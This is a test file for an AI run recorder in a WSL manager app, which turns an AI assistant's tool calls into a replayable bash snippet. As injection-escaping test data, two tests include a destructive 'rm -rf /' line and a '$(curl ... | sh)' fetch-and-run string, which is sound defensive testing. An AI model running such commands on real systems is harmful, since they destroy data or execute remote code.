/// Tests for `AiRunRecorder` (lib/api/ai_run_recorder.dart): the record of
/// what an AI chat turn changed on the machine, filed as a snippet so the
/// run can be reviewed, repeated and shared (ai-tasks#77).
// ignore_for_file: dangling_library_doc_comments

import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:wsl2distromanager/api/ai_run_recorder.dart';
import 'package:wsl2distromanager/api/mcp/mcp_server.dart';
import 'package:wsl2distromanager/api/quick_actions.dart';
import 'package:wsl2distromanager/components/helpers.dart';

/// A tool with the recording the real registry declares for it — or, with
/// none, a read-only one.
McpTool tool(String name, {ToolRecording? recording}) => McpTool(
      name: name,
      description: name,
      inputSchema: const {'type': 'object', 'properties': {}},
      handler: (_) async => '',
      recording: recording,
    );

final listDistros = tool('wsl_list_distros');
final createVm =
    tool('vm_create_linux', recording: const ToolRecording(target: 'name'));
final startVm = tool('vm_start',
    recording: const ToolRecording(target: 'name', supporting: true));
final runCommand = tool('wsl_run_command',
    recording: const ToolRecording(target: 'distro', shell: 'command'));
final setWslconfig =
    tool('wsl_set_wslconfig', recording: const ToolRecording());
final unregister = tool('wsl_unregister_distro',
    recording: const ToolRecording(target: 'distro'));
final mountDisk = tool('wsl_mount_disk', recording: const ToolRecording());

void main() {
  final at = DateTime(2026, 9, 14, 10, 7);

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    prefs = await SharedPreferences.getInstance();
  });

  group('what gets recorded', () {
    test('a tool without a recording leaves the record empty', () {
      final r = AiRunRecorder(request: 'what VMs do I have?', startedAt: at);
      r.record(listDistros, {}, 'dev\nweb');
      r.record(tool('wsl_distro_info'), {'distro': 'dev'}, 'running');

      expect(r.isEmpty, isTrue);
      expect(r.calls, isEmpty);
      expect(r.save(), isNull);
      expect(QuickAction().getFromPrefs(), isEmpty);
    });

    test('a run of supporting calls only — a VM start — files nothing', () {
      final r = AiRunRecorder(request: 'start dev', startedAt: at);
      r.record(startVm, {'name': 'dev'}, 'Started dev.');

      expect(r.calls, hasLength(1));
      expect(r.isEmpty, isTrue);
      expect(r.save(), isNull);
    });

    test('a supporting call is part of the record next to a real change', () {
      final r = AiRunRecorder(request: 'set up dev', startedAt: at);
      r.record(createVm, {'name': 'dev', 'catalog': 'debian-13-cloud'},
          'Created VM dev.');
      r.record(startVm, {'name': 'dev'}, 'Started dev.');

      expect(r.isEmpty, isFalse);
      expect(r.toScript(), contains('# 2. vm_start name="dev"'));
    });

    test('calls are kept in order, with the instances they name', () {
      final r = AiRunRecorder(request: 'set up a dev VM', startedAt: at);
      r.record(createVm, {'name': 'dev'}, 'Created VM dev.');
      r.record(startVm, {'name': 'dev'}, 'Started dev.');
      r.record(runCommand, {'distro': 'dev', 'command': 'apt-get update'},
          'Reading package lists...');
      r.record(setWslconfig,
          {'section': 'wsl2', 'key': 'memory', 'value': '8GB'}, 'ok');
      r.record(
          unregister, {'distro': 'old', 'confirm': true}, 'Unregistered old.');

      expect(r.calls.map((c) => c.tool).toList(), [
        'vm_create_linux',
        'vm_start',
        'wsl_run_command',
        'wsl_set_wslconfig',
        'wsl_unregister_distro',
      ]);
      // Deduplicated, first seen first; .wslconfig names no instance.
      expect(r.targets, ['dev', 'old']);
    });

    test('only the declared argument names an instance', () {
      // wsl_mount_disk has a `name` too — the mount point — and declares no
      // target, so it must not be mistaken for an instance.
      final r = AiRunRecorder(request: 'mount', startedAt: at);
      r.record(
          mountDisk, {'disk': r'\\.\PHYSICALDRIVE1', 'name': 'data'}, 'ok');
      expect(r.targets, isEmpty);
      expect(r.snippetName(), 'ai-run-2026-09-14-1007');
    });
  });

  group('the script', () {
    test('shell commands are kept verbatim, everything else is a comment', () {
      final r = AiRunRecorder(request: 'Install nginx on dev', startedAt: at);
      r.record(createVm, {'name': 'dev', 'catalog': 'debian-13-cloud'},
          'Created VM dev. Seeded from Debian 13.');
      r.record(
          runCommand,
          {
            'distro': 'dev',
            'command': 'apt-get update\napt-get install -y nginx',
          },
          'Setting up nginx (1.26) ...');

      final script = r.toScript();
      final lines = script.split('\n');

      expect(lines.first, '#!/bin/bash');
      expect(
          script,
          contains('# Recorded by the AI assistant in WSL Manager '
              'on 2026-09-14 10:07.'));
      expect(script, contains('# Request: Install nginx on dev'));
      expect(script, contains('# Instances: dev'));
      expect(
          script,
          contains(
              '# 1. vm_create_linux name="dev" catalog="debian-13-cloud"'));
      expect(script, contains('#    Created VM dev. Seeded from Debian 13.'));
      // The command argument is script, not a comment; its siblings are.
      expect(script, contains('# 2. wsl_run_command distro="dev"'));
      expect(script, isNot(contains('command=')));
      expect(lines, contains('apt-get update'));
      expect(lines, contains('apt-get install -y nginx'));
      expect(script, contains('#    Setting up nginx (1.26) ...'));

      // Every line that is not one of the two commands is a comment or
      // blank, so Run on the Snippets screen replays exactly the commands.
      for (final line in lines) {
        if (line == 'apt-get update' || line == 'apt-get install -y nginx') {
          continue;
        }
        expect(line.isEmpty || line.startsWith('#'), isTrue,
            reason: 'unexpected executable line: "$line"');
      }
    });

    test('a command that ran in a directory or as a user is replayed that way',
        () {
      final r = AiRunRecorder(request: 'build it', startedAt: at);
      r.record(
          runCommand,
          {
            'distro': 'dev',
            'command': 'npm install\nnpm run build',
            'cwd': '/home/alice/app',
            'user': 'alice',
          },
          '');

      final script = r.toScript();
      expect(
          script,
          contains(
              "su -s /bin/sh 'alice' -c 'cd '\\''/home/alice/app'\\'' && {\n"
              "npm install\nnpm run build\n}'"));
      // The context is in the comment as well, for reading.
      expect(script, contains('cwd="/home/alice/app" user="alice"'));
    });

    test('root and no directory need no wrapping', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(
          runCommand, {'distro': 'dev', 'command': 'id', 'user': 'root'}, '');
      expect(r.toScript().split('\n'), contains('id'));
      expect(r.toScript(), isNot(contains('su ')));
    });

    test('a failed step is part of the record', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(runCommand, {'distro': 'dev', 'command': 'false'},
          'Error: exit code 1');
      expect(r.toScript(), contains('#    Error: exit code 1'));
    });

    test('a long tool output is cut to a few lines at record time', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      final output = List.generate(50, (i) => 'line $i').join('\n');
      r.record(runCommand, {'distro': 'dev', 'command': 'find /'}, output);

      expect(
          r.calls.single.result,
          'line 0\nline 1\nline 2\nline 3\nline 4\n'
          'line 5…');
      final script = r.toScript();
      expect(script, contains('#    line 5…'));
      expect(script, isNot(contains('line 6')));
    });

    test('a wide tool output is cut by characters, with one marker', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(runCommand, {'distro': 'dev', 'command': 'x'}, 'y' * 1000);
      final kept = r.calls.single.result;
      expect(kept.length, AiRunRecorder.maxResultChars + 1);
      expect(kept, endsWith('y…'));
    });

    test('a multi-line request stays inside the comment', () {
      final r = AiRunRecorder(
          request: 'first line\n\nrm -rf / # not a command', startedAt: at);
      r.record(createVm, {'name': 'dev'}, '');
      final lines = r.toScript().split('\n');
      expect(lines, contains('# Request: first line'));
      expect(lines, contains('# rm -rf / # not a command'));
      for (final line in lines) {
        expect(line.isEmpty || line.startsWith('#'), isTrue,
            reason: 'a request line leaked out as a command: "$line"');
      }
    });

    test('comment text cannot be expanded by the shell that writes the file',
        () {
      // WSLApi.runCmds writes each snippet line through `echo "…"`, where
      // `$(…)`, `$VAR` and backticks still run — so tool output, the request
      // and argument values must be escaped in the comments they land in.
      final r = AiRunRecorder(request: r'costs $5, see `notes`', startedAt: at);
      r.record(runCommand, {'distro': 'dev', 'command': 'cat setup.sh'},
          r'$(curl -s https://x/y | sh)' '\n' r'`id`' '\n' r'C:\temp');
      r.record(createVm, {'name': 'dev', 'catalog': r'$HOME'}, '');

      final script = r.toScript();
      expect(script, contains(r'# Request: costs \$5, see \`notes\`'));
      expect(script, contains(r'#    \$(curl -s https://x/y | sh)'));
      expect(script, contains(r'#    \`id\`'));
      expect(script, contains(r'#    C:\\temp'));
      expect(script, contains(r'catalog="\$HOME"'));
      // The command itself is the user's to run and is not touched.
      expect(script.split('\n'), contains('cat setup.sh'));
      for (final line in script.split('\n')) {
        if (!line.startsWith('#')) continue;
        expect(line, isNot(matches(RegExp(r'(^|[^\\])[$`]'))),
            reason: 'unescaped expansion in comment: "$line"');
      }
    });
  });

  group('the snippet', () {
    test('is named after the first instance and the time, editor-safe', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(createVm, {'name': 'dev'}, 'ok');
      expect(r.snippetName(), 'ai-run-dev-2026-09-14-1007');
      expect(r.snippetName(), matches(RegExp(r'^[a-zA-Z0-9._-]+$')));
    });

    test('an instance name the editor would reject is made safe', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(createVm, {'name': 'my VM (old)'}, 'ok');
      expect(r.snippetName(), 'ai-run-my-VM-old-2026-09-14-1007');
    });

    test('without an instance the name is the time alone', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(setWslconfig, {'key': 'memory', 'value': '8GB'}, 'ok');
      expect(r.snippetName(), 'ai-run-2026-09-14-1007');
    });

    test('a taken name gets a counter instead of overwriting', () {
      final r = AiRunRecorder(request: 'x', startedAt: at);
      r.record(createVm, {'name': 'dev'}, 'ok');
      expect(
          r.snippetName(existingNames: [
            'ai-run-dev-2026-09-14-1007',
            'ai-run-dev-2026-09-14-1007-2',
          ]),
          'ai-run-dev-2026-09-14-1007-3');
    });

    test('the description is the request on one line, cut to fit', () {
      final r = AiRunRecorder(
          request: '  make\n\n  a   VM ${'x' * 200}', startedAt: at);
      expect(r.description, startsWith('make a VM xxx'));
      expect(r.description.length, AiRunRecorder.maxDescriptionChars);
      expect(r.description, endsWith('…'));
    });

    test('carries the instances as its distro field', () {
      final one = AiRunRecorder(request: 'x', startedAt: at)
        ..record(createVm, {'name': 'dev'}, 'ok');
      expect(one.toSnippet().distro, 'dev');

      final two = AiRunRecorder(request: 'x', startedAt: at)
        ..record(createVm, {'name': 'dev'}, 'ok')
        ..record(runCommand, {'distro': 'web', 'command': 'id'}, 'ok');
      expect(two.toSnippet().distro, ['dev', 'web']);

      final none = AiRunRecorder(request: 'x', startedAt: at)
        ..record(setWslconfig, {'key': 'memory', 'value': '8GB'}, 'ok');
      expect(none.toSnippet().distro, '');
    });

    test('save files it on the Snippets screen and survives a reload', () {
      final r = AiRunRecorder(request: 'Install nginx on dev', startedAt: at);
      r.record(runCommand,
          {'distro': 'dev', 'command': 'apt-get install -y nginx'}, 'ok');

      final saved = r.save();
      expect(saved, isNotNull);

      final stored = QuickAction().getFromPrefs();
      expect(stored, hasLength(1));
      expect(stored.single.name, 'ai-run-dev-2026-09-14-1007');
      expect(stored.single.description, 'Install nginx on dev');
      expect(stored.single.distro, 'dev');
      expect(stored.single.content, contains('apt-get install -y nginx'));
      expect(QuickAction().byName('ai-run-dev-2026-09-14-1007'), isNotNull);
      expect(QuickAction().names(), ['ai-run-dev-2026-09-14-1007']);
    });

    test('two runs in the same minute against one instance both survive', () {
      for (var i = 0; i < 2; i++) {
        final r = AiRunRecorder(request: 'run $i', startedAt: at);
        r.record(createVm, {'name': 'dev'}, 'ok');
        r.save();
      }
      expect(QuickAction().names(), [
        'ai-run-dev-2026-09-14-1007',
        'ai-run-dev-2026-09-14-1007-2',
      ]);
    });

    test('a later turn of the same session appends to its snippet', () {
      final first = AiRunRecorder(request: 'set up dev', startedAt: at)
        ..record(runCommand, {'distro': 'dev', 'command': 'echo a'}, 'a');
      final name = first.save()!.name;

      final later = DateTime(2026, 9, 14, 10, 12);
      final second = AiRunRecorder(request: 'now web', startedAt: later)
        ..record(runCommand, {'distro': 'web', 'command': 'echo b'}, 'b')
        ..record(runCommand,
            {'distro': 'web', 'command': 'echo c', 'user': 'eric'}, 'c');
      final saved = second.save(sessionSnippet: name)!;

      expect(saved.name, name);
      final stored = QuickAction().getFromPrefs();
      expect(stored, hasLength(1));
      final item = stored.single;
      expect(item.description, 'set up dev');
      expect(item.distro, ['dev', 'web']);
      final c = item.content;
      expect(c.indexOf('echo a'), lessThan(c.indexOf('echo b')));
      expect(c.indexOf('echo b'), lessThan(c.indexOf('echo c')));
      expect(
          c,
          contains('# --- Follow-up on 2026-09-14 10:12 ---\n'
              '# Request: now web\n'
              '# Instances: web\n'));
      // Per-command details survive the append.
      expect(c, contains("su -s /bin/sh 'eric' -c 'echo c'"));
      expect(c, contains('#    b'));
    });

    test('appending keeps what the user edited in the snippet', () {
      final first = AiRunRecorder(request: 'x', startedAt: at)
        ..record(runCommand, {'distro': 'dev', 'command': 'echo a'}, 'a');
      final item = first.save()!;
      QuickAction.addToPrefs(item..content = '#!/bin/bash\necho edited\n');

      AiRunRecorder(request: 'y', startedAt: at)
        ..record(runCommand, {'distro': 'dev', 'command': 'echo b'}, 'b')
        ..save(sessionSnippet: item.name);

      final c = QuickAction().byName(item.name)!.content;
      expect(c, startsWith('#!/bin/bash\necho edited\n\n# --- Follow-up'));
      expect(c, contains('echo b'));
      expect(QuickAction().byName(item.name)!.distro, 'dev');
    });
  });
}
